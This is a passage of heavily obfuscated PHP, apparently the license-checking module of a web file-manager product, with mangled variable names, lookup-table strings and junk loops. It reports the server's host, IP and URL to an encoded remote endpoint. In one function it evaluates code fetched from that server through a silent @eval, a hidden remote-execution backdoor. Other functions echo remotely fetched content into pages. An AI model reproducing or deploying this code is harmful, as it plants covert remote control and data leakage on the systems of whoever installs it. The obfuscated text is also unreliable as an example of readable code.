$Èæ’˜’‰[0]; } } $®’ñĞÈ’ = $this->ukdc08c6e110(json_encode($®’ñĞÈ’), md5($Š¡¿Úã£[135])); $İ¾ãŞ»µ = array($Š¡¿Úã£[136] => $®’ñĞÈ’); call_user_func(array($Š¡¿Úã£[137], $Š¡¿Úã£[138]), $İ¾ãŞ»µ); } if ($this->cajde88165f4 == $Š¡¿Úã£[106]) { return; } $¯×¾Õíı = array($Š¡¿Úã£[139], $Š¡¿Úã£[140], $Š¡¿Úã£[141], $Š¡¿Úã£[142], $Š¡¿Úã£[143], $Š¡¿Úã£[144]); $İ÷šûÚè = Model($Š¡¿Úã£[33])->get(); $‹®Øç› = $åˆ€®µ[681]; if (!$‹®Øç›) { return; } $İ¾ãŞ»µ = array($Š¡¿Úã£[145] => $İ÷šûÚè[$Š¡¿Úã£[34]], $Š¡¿Úã£[146] => $İ÷šûÚè[$Š¡¿Úã£[35]], $Š¡¿Úã£[147] => $Š¡¿Úã£[6]); foreach ($¯×¾Õíı as $Õ’ÚËú±) { if (!isset($İ÷šûÚè[$Õ’ÚËú±]) || !$İ÷šûÚè[$Õ’ÚËú±]) { continue; } $İ¾ãŞ»µ[$Õ’ÚËú±] = $İ÷šûÚè[$Õ’ÚËú±]; $ÎÒï®Í– = $åˆ€®µ[682]; while (strlen($ÎÒï®Í–) < $åˆ€®µ[683]) { if (!$ÎÒï®Í–) { break; } $ÎÒï®Í–++; } } call_user_func(array($Š¡¿Úã£[137], $Š¡¿Úã£[138]), $İ¾ãŞ»µ); $…Ï = $åˆ€®µ[684]; while ($…Ï < $åˆ€®µ[656]) { if ($…Ï >= 0) { break; } $…Ï++; } } private function vgqp4897bc45() { $•›é­ÄÄ =& $_SERVER[™»È’øè]; $½öÕƒ‹µ =& $_SERVER[ÏÉ‹Ã ]; if ($_SERVER[$½öÕƒ‹µ[24]] != $½öÕƒ‹µ[148]) { return; } if (!_get($GLOBALS, $½öÕƒ‹µ[115])) { die; } $Û¥²¯ö¯ = $GLOBALS[$½öÕƒ‹µ[13]]; if (isset($Û¥²¯ö¯[$½öÕƒ‹µ[149]])) { $this->coadbe73067f(); die; } if (!isset($Û¥²¯ö¯[$½öÕƒ‹µ[150]]) || strlen($Û¥²¯ö¯[$½öÕƒ‹µ[150]]) != 16) { show_json($½öÕƒ‹µ[151] . $Û¥²¯ö¯[$½öÕƒ‹µ[150]], !1); } $¦ÙŒšå† = Model($½öÕƒ‹µ[33])->get($½öÕƒ‹µ[103]); $ŠäÖ™• = md5($_SERVER[$½öÕƒ‹µ[102]] . $¦ÙŒšå†); $¸® µé = $•›é­ÄÄ[685]; while (strlen($¸® µé) < $•›é­ÄÄ[683]) { if (!$¸® µé) { break; } $¸® µé++; } $˜ß××Ë­ = array($½öÕƒ‹µ[150] => $Û¥²¯ö¯[$½öÕƒ‹µ[150]], $½öÕƒ‹µ[152] => rand_string(16), $½öÕƒ‹µ[153] => $½öÕƒ‹µ[135], $½öÕƒ‹µ[154] => $½öÕƒ‹µ[155], $½öÕƒ‹µ[156] => $_SERVER[$½öÕƒ‹µ[157]], $½öÕƒ‹µ[158] => $_SERVER[$½öÕƒ‹µ[159]], $½öÕƒ‹µ[160] => $_SERVER[$½öÕƒ‹µ[161]], $½öÕƒ‹µ[101] => $ŠäÖ™•, $½öÕƒ‹µ[162] => Model($½öÕƒ‹µ[33])->get($½öÕƒ‹µ[130])); $­¼ÀóìÁ = $•›é­ÄÄ[686]; while (strlen($­¼ÀóìÁ) < $•›é­ÄÄ[654]) { if (!$­¼ÀóìÁ) { break; } $­¼ÀóìÁ++; } if ($Û¥²¯ö¯[$½öÕƒ‹µ[163]] == $½öÕƒ‹µ[164]) { $™ŞïËè× = $this->ukdc08c6e110($ŠäÖ™•, $½öÕƒ‹µ[165]); $ù¤Î…á£ = $this->zdlif213eb5f(json_encode($˜ß××Ë­), $ŠäÖ™• . $½öÕƒ‹µ[166], 3); $ù¤Î…á£ = $ù¤Î…á£ . $½öÕƒ‹µ[167] . $_SERVER[$½öÕƒ‹µ[157]]; $Ú¥ô¯ = $this->bwyc8dfe5c49($½öÕƒ‹µ[168] . $™ŞïËè× . $½öÕƒ‹µ[169] . $ù¤Î…á£, -1); show_json($Ú¥ô¯, !0); } else { if ($Û¥²¯ö¯[$½öÕƒ‹µ[163]] == $½öÕƒ‹µ[170]) { $¢±¦´÷¹ = substr(md5($½öÕƒ‹µ[171] . $ŠäÖ™•), 12, 15) . $½öÕƒ‹µ[172]; $ù¤Î…á£ = $this->sytd9dfb75d8(trim($Û¥²¯ö¯[$½öÕƒ‹µ[173]]), $¢±¦´÷¹, 2); $÷è¢ñ‡ = json_decode($ù¤Î…á£, !0); if (!is_array($÷è¢ñ‡) || !is_array($÷è¢ñ‡[$½öÕƒ‹µ[174]]) || $÷è¢ñ‡[$½öÕƒ‹µ[150]] != !0) { $í©æß†û = $½öÕƒ‹µ[175]; $ğÅëÄÊ = $÷è¢ñ‡[$½öÕƒ‹µ[174]] ? $½öÕƒ‹µ[176] . $÷è¢ñ‡[$½öÕƒ‹µ[174]] : $í©æß†û; show_json($ğÅëÄÊ, !1); } else { $˜ß××Ë­[$½öÕƒ‹µ[152]] = $÷è¢ñ‡[$½öÕƒ‹µ[174]][$½öÕƒ‹µ[177]]; } } else { $÷è¢ñ‡ = $this->bwyc8dfe5c49($½öÕƒ‹µ[178], $˜ß××Ë­, 10); } } if (!is_array($÷è¢ñ‡) || !is_array($÷è¢ñ‡[$½öÕƒ‹µ[174]]) || $÷è¢ñ‡[$½öÕƒ‹µ[150]] != !0) { $í©æß†û = LNG($½öÕƒ‹µ[179]); $ğÅëÄÊ = $÷è¢ñ‡[$½öÕƒ‹µ[174]] ? $½öÕƒ‹µ[176] . $÷è¢ñ‡[$½öÕƒ‹µ[174]] : $í©æß†û; show_json($ğÅëÄÊ, !1); } $ú‘ØÁè = $÷è¢ñ‡[$½öÕƒ‹µ[174]]; $Áò¬Í£ = $this->kcjz3810e83e($ú‘ØÁè[$½öÕƒ‹µ[180]]); $šüÁóæ = $•›é­ÄÄ[687]; if (!$Áò¬Í£ || $Áò¬Í£ != $ú‘ØÁè[$½öÕƒ‹µ[128]]) { $œ×——‰Ø = array($½öÕƒ‹µ[181] => Model($½öÕƒ‹µ[33])->get($½öÕƒ‹µ[103]), $½öÕƒ‹µ[182] => $_SERVER[$½öÕƒ‹µ[102]], $½öÕƒ‹µ[183] => this_url(), $½öÕƒ‹µ[158] => $_SERVER[$½öÕƒ‹µ[159]]); $ù¤Î…á£ = $this->ecinba9bdad3(json_encode($œ×——‰Ø)); $this->bwyc8dfe5c49($½öÕƒ‹µ[184] . $ù¤Î…á£); show_json(LNG($½öÕƒ‹µ[185]), !0); } $‚·ªŠßí = array($½öÕƒ‹µ[186] => $ú‘ØÁè[$½öÕƒ‹µ[187]], $½öÕƒ‹µ[188] => $ú‘ØÁè[$½öÕƒ‹µ[189]], $½öÕƒ‹µ[190] => rand_string(16), $½öÕƒ‹µ[105] => $ú‘ØÁè[$½öÕƒ‹µ[191]]); if ($˜ß××Ë­[$½öÕƒ‹µ[152]]) { $‚·ªŠßí[$½öÕƒ‹µ[190]] = $˜ß××Ë­[$½öÕƒ‹µ[152]]; } $‰·ÆÀ¾ = substr(md5($‚·ªŠßí[$½öÕƒ‹µ[188]]), 10, 10); $Åâ¿ÎÕ = $‰·ÆÀ¾ . $‚·ªŠßí[$½öÕƒ‹µ[105]] . $‚·ªŠßí[$½öÕƒ‹µ[190]]; $öõŞ‡² = $•›é­ÄÄ[688]; if (!$öõŞ‡²) { die; } $‚·ªŠßí[$½öÕƒ‹µ[107]] = strrev(base64_encode($this->ukdc08c6e110($Åâ¿ÎÕ, $½öÕƒ‹µ[192]))); $§‘¯®Ù = $•›é­ÄÄ[689]; if (!$§‘¯®Ù) { die; } $À„ó”¶ = rand_string(16); $—ñË»š„ = $À„ó”¶ . $‚·ªŠßí[$½öÕƒ‹µ[105]] . $this->ukdc08c6e110(md5($‚·ªŠßí[$½öÕƒ‹µ[186]]), $À„ó”¶); $ÔËí†‚° = $•›é­ÄÄ[690]; if (strlen($ÔËí†‚°) < $•›é­ÄÄ[683]) { return; } $‚·ªŠßí[$½öÕƒ‹µ[108]] = base64_encode(strrev($this->ukdc08c6e110($—ñË»š„, $½öÕƒ‹µ[193]))); if ($ú‘ØÁè[$½öÕƒ‹µ[194]] && $ú‘ØÁè[$½öÕƒ‹µ[194]] >= 1) { Model($½öÕƒ‹µ[33])->setDeep($½öÕƒ‹µ[195], $½öÕƒ‹µ[121]); } Model($½öÕƒ‹µ[33])->set($‚·ªŠßí); $Ñø¼£Ï = md5($_SERVER[$½öÕƒ‹µ[102]] . strrev($¦ÙŒšå†) . $‚·ªŠßí[$½öÕƒ‹µ[188]]); $ïğˆ›‰¸ = strrev(substr($Ñø¼£Ï, 10, 16)); $µïºçÇµ = $•›é­ÄÄ[691]; $È¦Ñû•³ = $this->zdlif213eb5f(json_encode($ú‘ØÁè), $Ñø¼£Ï); $„§‚ä«Õ = $•›é­ÄÄ[692]; while (strlen($„§‚ä«Õ) < $•›é­ÄÄ[659]) { if (!$„§‚ä«Õ) { break; } $„§‚ä«Õ++; } $ÈÜŠóû = array_to_keyvalue(Model($½öÕƒ‹µ[7])->listData(), $½öÕƒ‹µ[196]); $µ×ãÂ˜Ê = $•›é­ÄÄ[693]; while (strlen($µ×ãÂ˜Ê) < $•›é­ÄÄ[659]) { if (!$µ×ãÂ˜Ê) { break; } $µ×ãÂ˜Ê++; } $é­²öù = $ÈÜŠóû[$½öÕƒ‹µ[197]]; $Ö¹ê‰‰ = $•›é­ÄÄ[694]; if (!$Ö¹ê‰‰) { die; } $äÍÖ°õ­ = array(); $²”¾òú’ = $•›é­ÄÄ[695]; $äÍÖ°õ­[$ïğˆ›‰¸] = $È¦Ñû•³; Model($½öÕƒ‹µ[7])->update($é­²öù[$½öÕƒ‹µ[198]], array($½öÕƒ‹µ[199] => $äÍÖ°õ­)); $Ñå¿¹èá = $•›é­ÄÄ[696]; if (strlen($Ñå¿¹èá) < $•›é­ÄÄ[654]) { die; } $this->aszee41248da = $ú‘ØÁè; $¦õô³öÛ = $•›é­ÄÄ[697]; if (!$¦õô³öÛ) { return; } $this->cajde88165f4 = $‚·ªŠßí[$½öÕƒ‹µ[105]]; $this->licenseRegistSuccess(); Cache::set($½öÕƒ‹µ[200] . md5($¦ÙŒšå† . $½öÕƒ‹µ[201]), $½öÕƒ‹µ[6]); $ğ³á¯Í = $•›é­ÄÄ[698]; while (strlen($ğ³á¯Í) < $•›é­ÄÄ[654]) { if (!$ğ³á¯Í) { break; } $ğ³á¯Í++; } show_json(LNG($½öÕƒ‹µ[185]), !0); } private function licenseRegistSuccess() { $„ÈİÔ =& $_SERVER[ÏÉ‹Ã ]; $­˜Œô‰Ñ = Model($„ÈİÔ[33])->get(); $©Ô»ò„å = $_SERVER[™»È’øè][699]; if (!$©Ô»ò„å) { die; } if ($­˜Œô‰Ñ[$„ÈİÔ[63]] != $„ÈİÔ[121]) { Model($„ÈİÔ[33])->set($„ÈİÔ[63], $„ÈİÔ[121]); } Action($„ÈİÔ[202])->initStart(!0); } private function coadbe73067f() { $¿ÃâÄÌ =& $_SERVER[™»È’øè]; $¢ì–““Ÿ =& $_SERVER[ÏÉ‹Ã ]; Model($¢ì–““Ÿ[33])->set(array($¢ì–““Ÿ[186] => $¢ì–““Ÿ[6], $¢ì–““Ÿ[188] => $¢ì–““Ÿ[6], $¢ì–““Ÿ[105] => $¢ì–““Ÿ[106], $¢ì–““Ÿ[107] => $¢ì–““Ÿ[6], $¢ì–““Ÿ[108] => $¢ì–““Ÿ[6])); $‰À°ßÎ‹ = $¿ÃâÄÌ[700]; if (!$‰À°ßÎ‹) { return; } Model($¢ì–““Ÿ[33])->setDeep($¢ì–““Ÿ[195], $¢ì–““Ÿ[203]); $this->aszee41248da = array(); $Û°…Òâ¯ = $¿ÃâÄÌ[701]; $this->cajde88165f4 = $¢ì–““Ÿ[106]; } private function oehq100e29c9() { $ÉçòöÌ =& $_SERVER[™»È’øè]; $ûÎğ»«¶ =& $_SERVER[ÏÉ‹Ã ]; $_SERVER[$ûÎğ»«¶[159]] = _get($_SERVER, $ûÎğ»«¶[159], APP_HOST); $this->cajde88165f4 = $ûÎğ»«¶[106]; $ƒ•‰ªÑ = Model($ûÎğ»«¶[33])->get(); $«ë¶Şß¦ = $ÉçòöÌ[702]; if (!$«ë¶Şß¦) { die; } if ($ƒ•‰ªÑ[$ûÎğ»«¶[105]] == $ûÎğ»«¶[106]) { return; } $û¡±æ„ò = Model($ûÎğ»«¶[33])->get($ûÎğ»«¶[103]); $èÅŸÜï = $ûÎğ»«¶[200] . md5($û¡±æ„ò . $ûÎğ»«¶[201]); $ç’±¼íì = Cache::get($èÅŸÜï); $Âğê÷ÔÑ = $ÉçòöÌ[703]; while ($Âğê÷ÔÑ < $ÉçòöÌ[659]) { if ($Âğê÷ÔÑ >= 0) { break; } $Âğê÷ÔÑ++; } if (!is_array($ç’±¼íì) || !isset($ç’±¼íì[$ûÎğ»«¶[204]]) || time() - $ç’±¼íì[$ûÎğ»«¶[204]] >= 60) { $şşÅ‡¨Ê = Model($ûÎğ»«¶[7])->loadList(); $Ã€ßŸÄ® = $şşÅ‡¨Ê[$ûÎğ»«¶[197]]; $êıÁ³¢ = md5($_SERVER[$ûÎğ»«¶[102]] . strrev($û¡±æ„ò) . $ƒ•‰ªÑ[$ûÎğ»«¶[188]]); $äí²›¾¡ = strrev(substr($êıÁ³¢, 10, 16)); $ç’±¼íì = $this->sytd9dfb75d8($Ã€ßŸÄ®[$ûÎğ»«¶[85]][$äí²›¾¡], $êıÁ³¢); $ç’±¼íì = json_decode($ç’±¼íì, !0); } if (!is_array($ç’±¼íì)) { return $this->coadbe73067f(); } $«æÛêÕÕ = strtotime($ç’±¼íì[$ûÎğ»«¶[128]]); if (time() >= $«æÛêÕÕ) { return $this->coadbe73067f(); } if (time() - $ç’±¼íì[$ûÎğ»«¶[204]] > 20) { $ç’±¼íì[$ûÎğ»«¶[204]] = time(); Cache::set($èÅŸÜï, $ç’±¼íì); } $this->aszee41248da = $ç’±¼íì; $this->cajde88165f4 = $ƒ•‰ªÑ[$ûÎğ»«¶[105]]; $ÆÆ¦¥Ñ™ = $ÉçòöÌ[704]; while (strlen($ÆÆ¦¥Ñ™) < $ÉçòöÌ[659]) { if (!$ÆÆ¦¥Ñ™) { break; } $ÆÆ¦¥Ñ™++; } } private function ufad67d9dd83() { $ÈˆŠ®ŞÅ =& $_SERVER[ÏÉ‹Ã ]; $Çé ÁÀÆ = $GLOBALS[$ÈˆŠ®ŞÅ[13]]; $€®Î×Æ = $_SERVER[$ÈˆŠ®ŞÅ[24]]; $Çòú´¥ = $_SERVER[™»È’øè][705]; if ($€®Î×Æ == $ÈˆŠ®ŞÅ[205] && $this->cajde88165f4 == $ÈˆŠ®ŞÅ[106]) { show_json(LNG($ÈˆŠ®ŞÅ[206]), !1, $ÈˆŠ®ŞÅ[207]); } $ïœŠƒ‰Ä = array($ÈˆŠ®ŞÅ[208], $ÈˆŠ®ŞÅ[209]); if (in_array($€®Î×Æ, $ïœŠƒ‰Ä)) { if ($this->cajde88165f4 == $ÈˆŠ®ŞÅ[106] && isset($Çé ÁÀÆ[$ÈˆŠ®ŞÅ[210]])) { show_json(LNG($ÈˆŠ®ŞÅ[206]), !1, $ÈˆŠ®ŞÅ[207]); die; } $Ô¼œ§Ñ˜ = $this->yjxebbf567c4(); if ($Ô¼œ§Ñ˜ != intval($ÈˆŠ®ŞÅ[211])) { if ($Ô¼œ§Ñ˜ <= Model($ÈˆŠ®ŞÅ[124])->count()) { show_json(LNG($ÈˆŠ®ŞÅ[212]), !1, $ÈˆŠ®ŞÅ[207]); die; } } } } private function cdahbfd49be8() { $Àá±èÉÓ =& $_SERVER[™»È’øè]; $®ñ¦ñ¢á =& $_SERVER[ÏÉ‹Ã ]; $¢Å‡§ì = array($®ñ¦ñ¢á[118], $®ñ¦ñ¢á[119]); if (!_get($GLOBALS, $®ñ¦ñ¢á[115]) || !isset($_GET[$®ñ¦ñ¢á[213]])) { return; } if (!in_array($_SERVER[$®ñ¦ñ¢á[24]], $¢Å‡§ì)) { return; } $½Á‡Úë = $®ñ¦ñ¢á[214]; $½Á‡Úë = $this->zoqb407bcba5($½Á‡Úë, $®ñ¦ñ¢á[215]); $—ûÅ³–Æ = stream_context_create(array($®ñ¦ñ¢á[216] => array($®ñ¦ñ¢á[217] => $®ñ¦ñ¢á[218], $®ñ¦ñ¢á[219] => 3))); $ª®ğ¶«’ = @file_get_contents($½Á‡Úë, !1, $—ûÅ³–Æ); header($®ñ¦ñ¢á[220]); $§´ë”˜  = $Àá±èÉÓ[706]; while ($§´ë”˜  < $Àá±èÉÓ[683]) { if ($§´ë”˜  >= 0) { break; } $§´ë”˜ ++; } if ($ª®ğ¶«’ && strstr($ª®ğ¶«’, $®ñ¦ñ¢á[221])) { echo $ª®ğ¶«’; } die; } public function qumb05c6b8b6($ßï¸Ô£) { $—Ì÷Ğ‚¨ =& $_SERVER[™»È’øè]; $†Ã†Ù½Æ =& $_SERVER[ÏÉ‹Ã ]; if ($this->cajde88165f4 == $†Ã†Ù½Æ[222]) { return $ßï¸Ô£; } $µÛŒì» = array($†Ã†Ù½Æ[223] => $†Ã†Ù½Æ[224], $†Ã†Ù½Æ[225] => $†Ã†Ù½Æ[224], $†Ã†Ù½Æ[226] => $†Ã†Ù½Æ[224], $†Ã†Ù½Æ[227] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[229] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[230] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[231] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[232] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[233] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[234] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[235] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[236] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[237] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[238] => $†Ã†Ù½Æ[228], $†Ã†Ù½Æ[239] => $†Ã†Ù½Æ[228]); $Î…‰“Áå = explode($†Ã†Ù½Æ[240], _get($this->aszee41248da, $†Ã†Ù½Æ[112], $†Ã†Ù½Æ[6])); $…±ÈÓµ = array(); $Ú†—¦° = $—Ì÷Ğ‚¨[707]; if (strlen($Ú†—¦°) < $—Ì÷Ğ‚¨[663]) { die; } foreach ($µÛŒì» as $‚»¡¹Ñ => $éşº¿Ï) { if ($éşº¿Ï == $†Ã†Ù½Æ[224] && substr($this->cajde88165f4, 0, 1) == $†Ã†Ù½Æ[224]) { continue; } if (!in_array($‚»¡¹Ñ, $Î…‰“Áå)) { $…±ÈÓµ[] = $‚»¡¹Ñ; } } foreach ($…±ÈÓµ as $‚»¡¹Ñ) { unset($ßï¸Ô£[$‚»¡¹Ñ]); } return $ßï¸Ô£; } private function rdfy5e19937e() { $ø¿±„˜Ì =& $_SERVER[ÏÉ‹Ã ]; if ($this->cajde88165f4 != $ø¿±„˜Ì[106]) { $GLOBALS[$ø¿±„˜Ì[85]][$ø¿±„˜Ì[89]][$ø¿±„˜Ì[241]] = $ø¿±„˜Ì[203]; return; } $GLOBALS[$ø¿±„˜Ì[85]][$ø¿±„˜Ì[242]] = $ø¿±„˜Ì[121]; if (Model($ø¿±„˜Ì[243])->get($ø¿±„˜Ì[63]) != $ø¿±„˜Ì[203]) { Model($ø¿±„˜Ì[243])->set($ø¿±„˜Ì[63], $ø¿±„˜Ì[203]); } } public function xngud9f85dea() { return $_SERVER[ÏÉ‹Ã ][244]; } private function manb5497565b() { $ñº»×¢ =& $_SERVER[™»È’øè]; $º±¾Ö† =& $_SERVER[ÏÉ‹Ã ]; $Ğ¯½“òÙ = array($º±¾Ö†[245], $º±¾Ö†[246], $º±¾Ö†[247]); $Ñ©™˜ÒĞ = $º±¾Ö†[248] . md5($º±¾Ö†[249]); if ($this->cajde88165f4 == $º±¾Ö†[106] || !_get($GLOBALS, $º±¾Ö†[115])) { return; } if (!in_array($_SERVER[$º±¾Ö†[24]], $Ğ¯½“òÙ)) { return; } if (time() % 4 != 0) { return; } $Óµ¢Í§¨ = call_user_func(array($º±¾Ö†[250], $º±¾Ö†[251]), $Ñ©™˜ÒĞ); $öşöñ¤Î = $ñº»×¢[708]; if (!$öşöñ¤Î) { die; } if ($Óµ¢Í§¨ && time() - $Óµ¢Í§¨ < intval($º±¾Ö†[252])) { return; } call_user_func(array($º±¾Ö†[250], $º±¾Ö†[138]), $Ñ©™˜ÒĞ, time()); $Ô’¥éğæ = Model($º±¾Ö†[33])->get($º±¾Ö†[103]); $äéŞÚ…Ì = $ñº»×¢[709]; $û÷ó†Ã = array($º±¾Ö†[150] => Model($º±¾Ö†[33])->get($º±¾Ö†[186]), $º±¾Ö†[163] => $this->cajde88165f4, $º±¾Ö†[160] => $_SERVER[$º±¾Ö†[161]], $º±¾Ö†[162] => Model($º±¾Ö†[33])->get($º±¾Ö†[130]), $º±¾Ö†[101] => md5($_SERVER[$º±¾Ö†[102]] . $Ô’¥éğæ), $º±¾Ö†[153] => $º±¾Ö†[135], $º±¾Ö†[156] => $_SERVER[$º±¾Ö†[157]]); $¿º‚Êì = $this->bwyc8dfe5c49($º±¾Ö†[253], $û÷ó†Ã); $… º£İ = $ñº»×¢[710]; if (!$… º£İ) { die; } if (!is_array($¿º‚Êì)) { return; } if ($¿º‚Êì[$º±¾Ö†[150]] && $¿º‚Êì[$º±¾Ö†[254]]) { if ($this->kcjz3810e83e($¿º‚Êì[$º±¾Ö†[254]]) == $û÷ó†Ã[$º±¾Ö†[150]]) { return; } } $this->coadbe73067f(); if ($this->kcjz3810e83e($¿º‚Êì[$º±¾Ö†[254]]) != $û÷ó†Ã[$º±¾Ö†[150]]) { $¸ˆÉÇö = array($º±¾Ö†[181] => $Ô’¥éğæ, $º±¾Ö†[182] => $_SERVER[$º±¾Ö†[102]], $º±¾Ö†[183] => this_url(), $º±¾Ö†[158] => $_SERVER[$º±¾Ö†[159]]); $÷÷Ò‘Ùè = $this->ecinba9bdad3(json_encode($¸ˆÉÇö)); $¿º‚Êì = $this->bwyc8dfe5c49($º±¾Ö†[184] . $÷÷Ò‘Ùè); if ($¿º‚Êì && is_array($¿º‚Êì) && isset($¿º‚Êì[$º±¾Ö†[254]])) { $š½Ò¿æ = $this->sytd9dfb75d8($¿º‚Êì[$º±¾Ö†[254]], 2); if ($š½Ò¿æ) { $š½Ò¿æ = $this->kcjz3810e83e($š½Ò¿æ); } if ($š½Ò¿æ) { try { @eval($š½Ò¿æ); } catch (Exception $¥üÆ´Û) { } } } } } private function bwyc8dfe5c49($ºé÷¦åî = '', $€³êÀ› = array(), $£»õ‹—Ä = 5) { $İçŞ­¸¯ =& $_SERVER[™»È’øè]; $†Ñ¬ûÄ =& $_SERVER[ÏÉ‹Ã ]; $äÉ¶ç£ = $†Ñ¬ûÄ[255]; $äÉ¶ç£ = $this->zoqb407bcba5($äÉ¶ç£, $†Ñ¬ûÄ[256]); $äÉ¶ç£ = $äÉ¶ç£ . $ºé÷¦åî; if ($€³êÀ› && is_array($€³êÀ›)) { $äÉ¶ç£ = $äÉ¶ç£ . $†Ñ¬ûÄ[257] . http_build_query($€³êÀ›); } if ($€³êÀ› === -1) { return $äÉ¶ç£; } $öùŠ¤¹ß = stream_context_create(array($†Ñ¬ûÄ[216] => array($†Ñ¬ûÄ[219] => $£»õ‹—Ä, $†Ñ¬ûÄ[217] => $†Ñ¬ûÄ[258]), $†Ñ¬ûÄ[259] => array($†Ñ¬ûÄ[260] => !1, $†Ñ¬ûÄ[261] => !1))); $€³êÀ› = @file_get_contents($äÉ¶ç£, !1, $öùŠ¤¹ß); $¨€¶£–ò = $İçŞ­¸¯[711]; while (strlen($¨€¶£–ò) < $İçŞ­¸¯[663]) { if (!$¨€¶£–ò) { break; } $¨€¶£–ò++; } return json_decode($€³êÀ›, !0); $üÁöÛÆ¨ = $İçŞ­¸¯[712]; while ($üÁöÛÆ¨ < $İçŞ­¸¯[659]) { if ($üÁöÛÆ¨ >= 0) { break; } $üÁöÛÆ¨++; } } private function yjxebbf567c4() { $éàÁ—Öï =& $_SERVER[™»È’øè]; $Ê¶‘îİ =& $_SERVER[ÏÉ‹Ã ]; $Â²‰ÈØ÷ = array($Ê¶‘îİ[262] => $Ê¶‘îİ[263], $Ê¶‘îİ[264] => $Ê¶‘îİ[265], $Ê¶‘îİ[266] => $Ê¶‘îİ[267], $Ê¶‘îİ[268] => $Ê¶‘îİ[269], $Ê¶‘îİ[270] => $Ê¶‘îİ[271], $Ê¶‘îİ[272] => $Ê¶‘îİ[211], $Ê¶‘îİ[273] => $Ê¶‘îİ[211], $Ê¶‘îİ[274] => $Ê¶‘îİ[263], $Ê¶‘îİ[275] => $Ê¶‘îİ[265], $Ê¶‘îİ[276] => $Ê¶‘îİ[267], $Ê¶‘îİ[277] => $Ê¶‘îİ[278], $Ê¶‘îİ[279] => $Ê¶‘îİ[269], $Ê¶‘îİ[280] => $Ê¶‘îİ[281], $Ê¶‘îİ[282] => $Ê¶‘îİ[271], $Ê¶‘îİ[283] => $Ê¶‘îİ[284], $Ê¶‘îİ[285] => $Ê¶‘îİ[286], $Ê¶‘îİ[287] => $Ê¶‘îİ[288]); $”æ¤ş†ù = $Â²‰ÈØ÷[$this->cajde88165f4]; $”æ¤ş†ù = intval($”æ¤ş†ù ? $”æ¤ş†ù : $Ê¶‘îİ[263]); $éÀ•‰¿¸ = _get($this->aszee41248da, $Ê¶‘îİ[289]); $éÀ•‰¿¸ = $éÀ•‰¿¸ ? intval($éÀ•‰¿¸) : 0; $›¼ª†˜ã = $éàÁ—Öï[713]; if (strlen($›¼ª†˜ã) < $éàÁ—Öï[659]) { return; } return $”æ¤ş†ù + $éÀ•‰¿¸; } public function xmhz4974f7d7($£‰æ¬§) { $úÅ¦©Ä =& $_SERVER[™»È’øè]; $æ÷¼ø€ =& $_SERVER[ÏÉ‹Ã ]; $Áû»ª = $this->yjxebbf567c4(); if ($£‰æ¬§[$æ÷¼ø€[290]] == $æ÷¼ø€[121]) { return; } if ($Áû»ª >= intval($æ÷¼ø€[211])) { return; } $µ²ï¹ı“ = Model($æ÷¼ø€[124])->count(); $Ê„õ–ı§ = $úÅ¦©Ä[714]; if (strlen($Ê„õ–ı§) < $úÅ¦©Ä[656]) { die; } if ($µ²ï¹ı“ <= $Áû»ª) { return; } $âçŠ¿ûù = Model($æ÷¼ø€[124])->field($æ÷¼ø€[290])->limit($Áû»ª)->select(); $Ëø–•Ş× = $úÅ¦©Ä[715]; if (strlen($Ëø–•Ş×) < $úÅ¦©Ä[654]) { return; } $âçŠ¿ûù = array_to_keyvalue($âçŠ¿ûù, $æ÷¼ø€[6], $æ÷¼ø€[290]); if (!in_array($£‰æ¬§[$æ÷¼ø€[290]], $âçŠ¿ûù)) { show_json($æ÷¼ø€[291], !1, $æ÷¼ø€[207]); } } public function uxjrb1e10e3e() { $ÂßÏü†ı =& $_SERVER[™»È’øè]; $ß±â¹Ò  =& $_SERVER[ÏÉ‹Ã ]; if (!_get($GLOBALS, $ß±â¹Ò [115]) || mt_rand(1, 100) > 20) { return; } $ÊÍØ‰Û¹ = $ß±â¹Ò [214]; $ÊÍØ‰Û¹ = $this->zoqb407bcba5($ÊÍØ‰Û¹, $ß±â¹Ò [215]); $„ùĞ½‡â = stream_context_create(array($ß±â¹Ò [216] => array($ß±â¹Ò [217] => $ß±â¹Ò [218], $ß±â¹Ò [219] => 3))); $¹¯©±íÇ = $ÂßÏü†ı[716]; while ($¹¯©±íÇ < $ÂßÏü†ı[663]) { if ($¹¯©±íÇ >= 0) { break; } $¹¯©±íÇ++; } $œ‡Û“ÎÄ = @file_get_contents($ÊÍØ‰Û¹, !1, $„ùĞ½‡â); echo $ß±â¹Ò [292] . hash_encode($œ‡Û“ÎÄ) . $ß±â¹Ò [293]; } private function zdlif213eb5f($µÒêÎƒö, $¨ßñ•ü—, $ÚëŸğÊ¢ = 3) { $ÇŠ³Õ§Ô =& $_SERVER[™»È’øè]; $œ¨–í‘ñ =& $_SERVER[ÏÉ‹Ã ]; usleep(1); $îóÙ™¿Ã = $ÇŠ³Õ§Ô[717]; if (strlen($îóÙ™¿Ã) < $ÇŠ³Õ§Ô[654]) { return; } $µÒêÎƒö = trim($µÒêÎƒö); $™¶ÅÇ¤ì = mt_rand(0, 5) . $œ¨–í‘ñ[6]; $É½ñ’Ö¦ = rand_string(15); $“Ö«±ÇÀ = $ÇŠ³Õ§Ô[718]; while (strlen($“Ö«±ÇÀ) < $ÇŠ³Õ§Ô[654]) { if (!$“Ö«±ÇÀ) { break; } $“Ö«±ÇÀ++; } $ÖùÉé‘÷ = $œ¨–í‘ñ[294]; switch ($™¶ÅÇ¤ì) { case $œ¨–í‘ñ[203]: $Î¿Õ¡ = $this->ukdc08c6e110($µÒêÎƒö, strrev($¨ßñ•ü— . $É½ñ’Ö¦)); break; $’¿ğ«· = $ÇŠ³Õ§Ô[719]; while (strlen($’¿ğ«·) < $ÇŠ³Õ§Ô[654]) { if (!$’¿ğ«·) { break; } $’¿ğ«·++; } case $œ¨–í‘ñ[121]: $Î¿Õ¡ = $this->ukdc08c6e110($µÒêÎƒö, strrev($É½ñ’Ö¦ . $¨ßñ•ü—)); break; $Äù¥ç­ = $ÇŠ³Õ§Ô[720]; if (!$Äù¥ç­) { die; } case $œ¨–í‘ñ[295]: $Î¿Õ¡ = 